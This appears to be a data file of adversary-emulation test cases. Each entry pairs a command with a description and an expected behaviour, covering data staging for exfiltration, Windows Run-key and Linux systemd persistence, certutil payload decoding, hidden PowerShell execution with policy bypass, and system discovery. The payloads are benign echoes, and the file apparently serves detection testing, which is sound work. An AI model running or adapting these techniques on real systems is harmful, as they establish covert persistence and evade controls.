attacks.command: tmpdir=$(mktemp -d) && echo 'mock_config_data' > "$tmpdir/config.txt" && echo 'user_log_entry' > "$tmpdir/log.txt" && tar -cf "$tmpdir/archive.tar" -C "$tmpdir" config.txt log.txt && base64 "$tmpdir/archive.tar" > "$tmpdir/encoded_exfil.b64" && cat "$tmpdir/encoded_exfil.b64"
attacks.description: Advanced: Use temporary directory, create mock files, archive them, and store base64 encoding in a file for exfiltration
attacks.expected_behavior: Generates a secure temporary directory, creates two test files, archives them into a tar file, encodes the archive using base64, saves the output to a file, and displays it. Simulates preparation stage of data exfiltration with encoding.

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestStartup" /t REG_SZ /d "cmd.exe /c echo Hello from Run Key & pause" /f
attacks.description: Basic: Adds a persistent entry to the current user's Run key using the reg.exe binary.
attacks.expected_behavior: Adds a registry value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run named 'TestStartup'. On next user login, cmd.exe will execute with the echo command. No system impact; easily removable.

attacks.command: powershell -Command "& reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v 'Updater' /t REG_SZ /d 'powershell -Command Start-Sleep -Seconds 5; Write-Output \"Persistent task running\"' /f"
attacks.description: Intermediate: Uses PowerShell to invoke reg.exe with a nested command string, simulating obfuscation.
attacks.expected_behavior: Adds a Run key entry that executes a PowerShell command after a delay. The command outputs a test message. Uses proper escaping to prevent syntax errors. Runs under current user context.

attacks.command: cmd.exe /c "echo Test payload > "%TEMP%\runkey_test.log" && reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v \"SystemUpdater\" /t REG_SZ /d \"cmd.exe /c echo Running as system >> \"%TEMP%\\runkey_log.txt\"\" /f"
attacks.description: Advanced: Simulates a high-privilege persistence mechanism by writing to HKLM Run key and logging to temp.
attacks.expected_behavior: Creates a log file in %TEMP% and adds a Run key under HKLM. On next boot, cmd appends a message to the log. Requires admin to modify HKLM. Safe because it only appends to user temp files.

attacks.description: Creates user-level autostart entry for persistence
attacks.expected_behavior: Creates ~/.config/autostart/test.desktop which executes /tmp/test.sh on user login

attacks.description: Adds @reboot cron job for system-wide persistence
attacks.expected_behavior: Inserts @reboot cron entry to execute /tmp/test.sh at system startup

attacks.command:
echo -e '[Service]
ExecStart=/tmp/test.sh
[Install]
WantedBy=multi-user.target' | sudo tee /etc/systemd/system/mytest.service && sudo systemctl enable mytest.service
attacks.description: Creates systemd service for privileged persistence
attacks.expected_behavior: Creates and enables systemd service that runs /tmp/test.sh at boot (requires root)

attacks.description: Basic execution of a JavaScript file masquerading as a document, using EICAR test string to simulate malicious content safely.
attacks.expected_behavior: Creates a JavaScript file in the temp directory with EICAR test string and executes it via the default handler (WScript/CScript). Simulates user opening a malicious attachment.

attacks.command: certutil.exe -decode - "%TEMP%\payload.txt" "%TEMP%\invoice.exe" > nul 2>&1 && echo This is a benign executable placeholder > "%TEMP%\payload.txt" && start "" "%TEMP%\invoice.exe"
attacks.description: Intermediate: Decodes a base64-encoded placeholder file using certutil (a built-in Windows binary) and executes it, simulating side-loading or malicious document extraction.
attacks.expected_behavior: Creates a text file with benign content, 'decodes' it into an executable placeholder using certutil, and launches it. Mimics unpacking and execution of a malicious payload.

attacks.command: powershell -Command "mkdir '%TEMP%\_updates' -ErrorAction SilentlyContinue; $content = 'Write-Output \"System update in progress...\"'; Set-Content -Path '%TEMP%\_updates\update.ps1' -Value $content -Force; Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File "%TEMP%\_updates\update.ps1"' -WindowStyle Hidden"
attacks.description: Advanced: Creates a hidden PowerShell script in a temporary subdirectory and executes it with bypass policy, simulating stealthy execution of a malicious script.
attacks.expected_behavior: Creates a subdirectory in temp, writes a benign PowerShell script, and runs it hidden. Simulates execution of a malicious script with obfuscation and evasion intent.

attacks.description: Basic user execution: creates a hidden shell script in user cache directory and executes it.
attacks.expected_behavior: Creates a script file in the user's cache directory, sets executable permission, and runs it. Outputs a benign test message to stdout.

attacks.description: Intermediate: decodes a base64-encoded command string and executes it via shell.
attacks.expected_behavior: Decodes a base64 string (containing a simple echo command) and pipes it to sh for execution. Outputs a benign test message.

attacks.command: TMPFILE=$(mktemp --suffix=.sh); echo 'echo "User execution via temporary obfuscated script"; exit' > "$TMPFILE" && chmod +x "$TMPFILE" && "$TMPFILE" -ErrorAction SilentlyContinue
attacks.description: Advanced: creates a randomly named temporary script with obfuscation intent and executes it.
attacks.expected_behavior: Generates a temporary .sh file, writes a benign payload, makes it executable, and runs it. The use of mktemp and dynamic naming simulates evasion techniques. Outputs a test message and cleans up on exit.

attacks.description: Retrieve detailed system information including OS version, hotfixes, and hardware
attacks.expected_behavior: Outputs comprehensive system information such as OS Name, Version, System Manufacturer, Model, Processor(s), Memory, Hotfixes, etc. to stdout. Runs without elevated privileges but may show limited hotfix data if not admin.

attacks.description: Query WMI for key system hardware and memory attributes
attacks.expected_behavior: Prints computer name, model, manufacturer, and total physical memory in bytes. Uses built-in wmic.exe, common in post-breach discovery. No file system changes or network calls.

attacks.command: powershell -Command "try { $sys = Get-CimInstance -ClassName Win32_ComputerSystem; $os = Get-CimInstance -ClassName Win32_OperatingSystem; $proc = Get-CimInstance -ClassName Win32_Processor; $out = @{ 'ComputerName' = $sys.Name; 'Model' = $sys.Model; 'MemoryGB' = [math]::round($sys.TotalPhysicalMemory / 1GB); 'OS' = $os.Caption; 'Version' = $os.Version; 'CPU' = $proc.Name }; ConvertTo-Json $out } catch { Write-Error $_.Exception.Message -ErrorAction SilentlyContinue }"
attacks.description: Use PowerShell to gather and format detailed system information via CIM
attacks.expected_behavior: Outputs a JSON-formatted summary of system name, model, memory (GB), OS name, version, and CPU. Uses Get-CimInstance (modern WMI access) within a try-catch block to handle errors gracefully. No file operations, so -Force is not used. Quotes are properly escaped using double quotes around the command and single quotes within. Safe for isolated testing.

attacks.description: Basic system information discovery using uname to retrieve kernel and OS version
attacks.expected_behavior: Outputs kernel name, hostname, kernel version, and architecture to stdout

attacks.description: Intermediate system discovery by reading OS identification details from /etc/os-release
attacks.expected_behavior: Displays operating system name, version, and other metadata fields

attacks.description: Advanced hardware and system information discovery using lshw to list hardware configuration in brief format
attacks.expected_behavior: Prints a concise list of hardware components (e.g. CPU, memory, storage) if lshw is installed; otherwise outputs fallback message
